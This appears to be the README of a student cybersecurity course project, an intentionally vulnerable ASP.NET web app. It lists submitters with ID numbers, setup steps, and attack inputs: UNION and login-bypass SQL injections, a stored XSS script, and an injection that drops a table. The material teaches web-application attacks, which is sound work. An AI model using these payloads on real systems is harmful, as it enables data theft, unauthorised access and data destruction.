# Cyber course project in asp.net
## submitters: 
214882482 - Ido Shemi <br />
215329095 - Niv Aderet <br />
319274874 - Oleg Shehter <br />
207379769 - Idit Oksman

## installation guide
1. Clone the GitHub repository to your desktop.
2. Ensure that Visual Studio with ASP.NET extensions is installed.
3. Check if your computer has .NET Framework 4.8 installed.
4. Copy the DbConfig.json file to the appropriate directory (e.g., C:\Program Files\IIS Express).

## attack examples
* clients sql injection:<br />
    **user name:** 4' UNION SELECT client_id, org_id, name, surname, client_username FROM postgres.cyberschema1.clients WHERE '1'='1' --

* login sql injection: <br />
    **mail:** test@test.com' or '1'='1

* clients stored-xss:<br />
    **user name:** 2<script>alert("vulnerability found");</script>

* registration injection: <br />
    **mail:** test@test.com'; DROP TABLE postgres.cyberschema1.stam --
